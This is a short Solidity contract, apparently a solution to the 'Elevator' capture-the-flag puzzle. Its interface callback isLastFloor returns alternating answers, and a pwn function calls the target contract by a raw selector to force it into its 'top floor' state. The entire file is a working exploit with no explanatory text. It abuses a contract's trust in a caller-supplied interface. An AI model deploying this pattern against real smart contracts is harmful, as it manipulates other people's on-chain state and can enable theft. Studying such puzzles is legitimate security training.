// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Contract {

    bool private lastFloor;
    constructor() {
        lastFloor = false;
    }

    function isLastFloor(uint floor) external returns (bool) {
        lastFloor = !lastFloor;
        return !lastFloor;
    }

    function pwn(address elevator) external {
        (bool success, ) = elevator.call(abi.encodeWithSelector(bytes4(0xed9a7134), 10));
        require(success);
    }
}
